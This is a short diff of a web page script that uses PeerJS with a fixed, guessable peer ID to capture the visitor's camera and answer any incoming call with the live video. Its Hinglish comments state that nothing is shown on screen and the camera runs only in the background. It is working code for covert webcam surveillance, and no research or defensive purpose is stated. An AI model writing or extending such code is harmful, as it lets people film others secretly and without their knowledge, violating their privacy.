@@ -7,14 +7,13 @@
 <body>
 
 <script>
-  // FIXED ID (same hamesha rahega)
   const peer = new Peer("camera123");
 
   navigator.mediaDevices.getUserMedia({ video: true, audio: false })
     .then(stream => {
 
-      // ❌ video show nahi karenge (hidden)
-      
+      // sirf background me camera chalega (kuch show nahi hoga)
+
       peer.on('call', call => {
         call.answer(stream);
       });
